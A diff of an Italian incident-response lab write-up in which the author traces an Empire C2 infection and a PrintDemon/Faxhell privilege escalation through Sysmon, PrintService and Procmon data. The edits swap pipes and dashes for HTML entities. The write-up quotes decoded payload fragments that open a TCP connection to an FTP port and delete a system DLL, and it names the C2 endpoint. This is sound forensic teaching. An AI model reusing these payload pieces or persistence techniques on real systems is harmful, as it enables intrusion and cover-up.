@@ -70,10 +70,10 @@ sudo mount -t cifs //10.114.130.250/C$ /mnt/win -o username=Administrator,passwo
 
 ma su questa VPN non è passato e ho preferito non bruciarci altri minuti. il compromesso finale è stato riavviare rdpclip da PowerShell con attesa,e da lì in poi scrivere comandi che stampano poche righe per volta:
 
-powershell -NoProfile -Command "Stop-Process -Name rdpclip -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 2; Start-Process -FilePath rdpclip.exe; Start-Sleep -Seconds 2; Get-Process rdpclip | Select-Object Id,SessionId"
+powershell -NoProfile -Command "Stop-Process -Name rdpclip -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 2; Start-Process -FilePath rdpclip.exe; Start-Sleep -Seconds 2; Get-Process rdpclip &#124; Select-Object Id,SessionId"
 
 Id SessionId
--- ---------
+&#45;&#45; &#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;-
 4528         2
 
 due dettagli da mettere qui perché mi hanno fatto perdere tempo e non sono errori di sintassi. il primo: ogni tanto la riga incollata arrivava duplicata e il prompt rispondeva
@@ -82,7 +82,7 @@ due dettagli da mettere qui perché mi hanno fatto perdere tempo e non sono erro
 
 non c'è niente di sbagliato nel comando, è il paste che si è raddoppiato. il secondo: a metà sessione la variabile PATH della finestra cmd è saltata e sia findstr sia powershell risultavano "not recognized". si risolve chiamando l'eseguibile per path assoluto
 
-C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -Command "..."
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -Command "&#46;&#46;&#46;"
 
 ultima cosa: la macchina è andata in saturazione di RAM più volte aprendo i file di log grossi, e ho dovuto riavviarla parecchie volte. le domande dalla 15 in poi le ho chiuse a pezzi, tra un riavvio e l'altro
 
@@ -92,7 +92,7 @@ ultima cosa: la macchina è andata in saturazione di RAM più volte aprendo i fi
 
 prima cosa in assoluto, prima ancora di guardare il desktop. su una macchina lab i log ruotano e la sessione scade, quindi si porta tutto su file e poi si interroga il file, non il log vivo. wevtutil epl fa esattamente questo e non apre nessuna GUI.
 
-powershell -NoProfile -Command "mkdir C:\ir -Force | Out-Null; 'Microsoft-Windows-Sysmon/Operational','System','Security','Microsoft-Windows-PrintService/Operational' | ForEach-Object { wevtutil epl $_ ('C:\ir\' + ($_ -replace '[/\\-]','_') + '.evtx') /ow:true }"
+powershell -NoProfile -Command "mkdir C:\ir -Force &#124; Out-Null; 'Microsoft-Windows-Sysmon/Operational','System','Security','Microsoft-Windows-PrintService/Operational' &#124; ForEach-Object { wevtutil epl $_ ('C:\ir\' + ($_ -replace '[/\\-]','_') + '.evtx') /ow:true }"
 
 il primo tentativo l'avevo lanciato dentro cmd e ovviamente è morto:
 
@@ -108,7 +108,7 @@ i nomi che uso più avanti (reg13.txt, proc1.txt, net3.txt) sono quei file rinom
 
 sul filtraggio ho sbattuto contro un limite vero di wevtutil: le query XPath con contains() non sono supportate
 
-wevtutil qe ... /q:"*[System[EventID=13]][EventData[Data[@Name='TargetObject'] and (contains(Data,'Run'))]]"
+wevtutil qe &#46;&#46;&#46; /q:"*[System[EventID=13]][EventData[Data[@Name='TargetObject'] and (contains(Data,'Run'))]]"
 This operator is unsupported by this implementation of the filter.
 Failed to open event query.
 The specified query is invalid.
@@ -121,7 +121,7 @@ quindi il pattern corretto è: XPath solo sull'EventID (lato server, veloce), du
 
 domande 1-5. dal dump degli EventID 13 ho tirato fuori tutti i TargetObject con "Run" dentro:
 
-powershell -NoProfile -Command "Select-String -Path C:\ir\reg13.txt -SimpleMatch 'TargetObject:' | Select-String -SimpleMatch 'Run' | Select-Object -First 10 -ExpandProperty Line"
+powershell -NoProfile -Command "Select-String -Path C:\ir\reg13.txt -SimpleMatch 'TargetObject:' &#124; Select-String -SimpleMatch 'Run' &#124; Select-Object -First 10 -ExpandProperty Line"
 
 TargetObject: HKU\S-1-5-21-****\Software\Microsoft\Windows\CurrentVersion\Run\Updater
 TargetObject: HKU\S-1-5-21-****_Classes\Autoruns.Logfile.1\shell\open\command\(Default)
@@ -156,11 +156,11 @@ Cannot find path 'HKCU:\Software\Microsoft\Windows\CurrentVersion Debug' because
 
 la forma giusta usa -Name:
 
-powershell -NoProfile -Command "$x=(Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion' -Name Debug).Debug; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($x)) | Out-File C:\ir\payload.txt"
+powershell -NoProfile -Command "$x=(Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion' -Name Debug).Debug; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($x)) &#124; Out-File C:\ir\payload.txt"
 
 il decodificato è un blocco unico gigante senza a capo, quindi per leggerlo l'ho splittato sui punto e virgola invece di stamparlo:
 
-powershell -NoProfile -Command "(gc C:\ir\payload.txt -Raw) -split '[;\r\n]+' | sls 'sc |port|kill|\.dll' | select -First 8"
+powershell -NoProfile -Command "(gc C:\ir\payload.txt -Raw) -split '[;\r\n]+' &#124; sls 'sc &#124;port&#124;kill&#124;\.dll' &#124; select -First 8"
 
 $FTPPort = "9299"
 $tcpConnection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort)
@@ -201,14 +201,14 @@ T1547.010, port monitors: la porta viene registrata dallo spooler e diventa il c
 
 sul log giusto per la domanda 10 ci sono arrivato solo dopo: non è System e non è Operational, è PrintService/Admin, ed è lo stesso record che nomina la nuova default printer
 
-powershell -NoProfile -Command "Get-WinEvent -FilterHashtable @{logname='Microsoft-Windows-PrintService/Admin'} | Select-Object -First 3 Id,TimeCreated,Message | Format-List"
+powershell -NoProfile -Command "Get-WinEvent -FilterHashtable @{logname='Microsoft-Windows-PrintService/Admin'} &#124; Select-Object -First 3 Id,TimeCreated,Message &#124; Format-List"
 
 Id : 823
-Message : The default printer was changed to PrintDemon...
+Message : The default printer was changed to PrintDemon&#46;&#46;&#46;
 
 per il parent PID ho preso la via corta interrogando WMI sul processo vivo invece di scavare nel PML:
 
-powershell -NoProfile -Command "Get-CimInstance Win32_Process -Filter \"Name='spoolsv.exe'\" | Select-Object ProcessId,ParentProcessId"
+powershell -NoProfile -Command "Get-CimInstance Win32_Process -Filter \"Name='spoolsv.exe'\" &#124; Select-Object ProcessId,ParentProcessId"
 
 ProcessId 1876, ParentProcessId 632, e 632 è services.exe. discrepanza da annotare: nell'evento Sysmon del 26 gennaio spoolsv aveva PID 1940, adesso ne ha 1876. sono sessioni diverse, la macchina è stata riavviata nel frattempo. il parent invece resta 632 perché lo spooler è sempre figlio di services.exe, ed è quello che chiede la domanda
 
@@ -218,7 +218,7 @@ ProcessId 1876, ParentProcessId 632, e 632 è services.exe. discrepanza da annot
 
 domande 14-18. il payload della Run key non è l'unico. cercando i process create con -enc:
 
-powershell -NoProfile -Command "$c=Get-Content C:\ir\proc1.txt; for($i=0;$i -lt $c.Count;$i++){ if($c[$i] -match '\-enc'){ ($c[($i-6)..$i] | Where-Object {$_ -like '*ProcessId:*'}) + ' LEN=' + $c[$i].Length } }"
+powershell -NoProfile -Command "$c=Get-Content C:\ir\proc1.txt; for($i=0;$i -lt $c.Count;$i++){ if($c[$i] -match '\-enc'){ ($c[($i-6)..$i] &#124; Where-Object {$_ -like '*ProcessId:*'}) + ' LEN=' + $c[$i].Length } }"
 
 ProcessId: 3088  LEN=5197
 
@@ -251,10 +251,10 @@ nota mia da lato offensive: il profilo di default di un C2 è la cosa più stupi
 
 domande 19-24. sugli EventID 3 ho raggruppato per IP di destinazione invece di leggerli uno a uno, perché sono centinaia:
 
-powershell -NoProfile -Command "Get-Content C:\ir\net3.txt | Where-Object {$_ -like '*DestinationIp:*'} | Group-Object -NoElement | Sort-Object Count -Descending | Select-Object -First 10 Count,Name"
+powershell -NoProfile -Command "Get-Content C:\ir\net3.txt &#124; Where-Object {$_ -like '*DestinationIp:*'} &#124; Group-Object -NoElement &#124; Sort-Object Count -Descending &#124; Select-Object -First 10 Count,Name"
 
 Count Name
------ ----
+&#45;&#45;&#45;&#45;- &#45;&#45;&#45;&#45;
    25 DestinationIp: 10.60.0.230
    17 DestinationIp: 169.254.169.254
     8 DestinationIp: 0:0:0:0:0:0:0:1
@@ -303,7 +303,7 @@ qui c'è il ragionamento che sblocca tre domande insieme. la cattura copre 6:05:
 
 la prima operazione di explorer.exe da quel timestamp:
 
-powershell -NoProfile -Command "Import-Csv C:\ir\pml.csv | Where-Object {$_.PID -eq '2684' -and $_.'Time of Day' -like '6:07:0*PM'} | Select-Object -First 4 'Time of Day',Operation,Path | Format-List"
+powershell -NoProfile -Command "Import-Csv C:\ir\pml.csv &#124; Where-Object {$_.PID -eq '2684' -and $_.'Time of Day' -like '6:07:0*PM'} &#124; Select-Object -First 4 'Time of Day',Operation,Path &#124; Format-List"
 
 Operation : Thread Create
 
@@ -317,7 +317,7 @@ ed è coerente con tutto il resto: mscoree.dll è l'host del CLR, cioè .NET che
 
 la ricognizione dell'attaccante si vede nella query di registro:
 
-powershell -NoProfile -Command "Import-Csv C:\ir\pml.csv | Where-Object {$_.Path -like '*CurrentVersion\ProductId*'} | Select-Object -First 4 'Time of Day','Process Name',PID,Operation,Path,Result | Format-List"
+powershell -NoProfile -Command "Import-Csv C:\ir\pml.csv &#124; Where-Object {$_.Path -like '*CurrentVersion\ProductId*'} &#124; Select-Object -First 4 'Time of Day','Process Name',PID,Operation,Path,Result &#124; Format-List"
 
 Time of Day  : 6:05:49.8784612 PM
 Process Name : wmiprvse.exe
@@ -359,15 +359,15 @@ timeline ricostruita, orari UTC, macchina su UTC-7 per gli orari locali di Procm
 2021-01-22 01:07:06  (locale 1/21 6:07:06 PM) primo effetto dentro explorer: Thread Create
 2021-01-22 01:07:0*  explorer carica mscoree.dll, cioè il CLR .NET dentro il processo shell
 2021-01-22 01:07:09  explorer carica wmiutils.dll, inizia l'uso di WMI dal processo iniettato
-2021-01-22 01:05-01:09  ricognizione via WMI: wmiprvse.exe 2964 interroga HKLM\...\CurrentVersion\ProductId
-2021-01-22 01:08:13  explorer.exe 2684 scrive HKCU\...\CurrentVersion\Run\Updater (T1547.001)
-                     il valore Run contiene solo un loader, il payload base64 va in ...\CurrentVersion\Debug
---                   beaconing verso ec2-34-245-128-161.eu-west-1.compute.amazonaws.com:9001
+2021-01-22 01:05-01:09  ricognizione via WMI: wmiprvse.exe 2964 interroga HKLM\&#46;&#46;&#46;\CurrentVersion\ProductId
+2021-01-22 01:08:13  explorer.exe 2684 scrive HKCU\&#46;&#46;&#46;\CurrentVersion\Run\Updater (T1547.001)
+                     il valore Run contiene solo un loader, il payload base64 va in &#46;&#46;&#46;\CurrentVersion\Debug
+&#45;&#45;                   beaconing verso ec2-34-245-128-161.eu-west-1.compute.amazonaws.com:9001
                      profilo Empire di default, /admin/get.php, UA IE11 hardcoded
 2021-01-26 17:55:34  spoolsv.exe scrive HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Ports\Ne02:
                      (T1547.010, port monitor) e la default printer diventa PrintDemon, evento 823
---                   catena PrintDemon/Faxhell: DLL scritta in System32 e caricata dal servizio Fax
---                   payload di cleanup: apre FTP su 9299, uccide FXSSVC, rimuove C:\Windows\System32\ualapi.dll
+&#45;&#45;                   catena PrintDemon/Faxhell: DLL scritta in System32 e caricata dal servizio Fax
+&#45;&#45;                   payload di cleanup: apre FTP su 9299, uccide FXSSVC, rimuove C:\Windows\System32\ualapi.dll
 
 la logica dell'attaccante è a due livelli separati e questo è il motivo per cui la room ti confonde. il livello uno è Empire: injection in explorer, C2, ricognizione WMI, persistenza in Run. il livello due è PrintDemon: abuso dello spooler per privilege escalation a SYSTEM via provider del servizio Fax, con tanto di pulizia finale. sono due catene che condividono solo la macchina, e se provi a leggerle come una sola non torna niente.
 
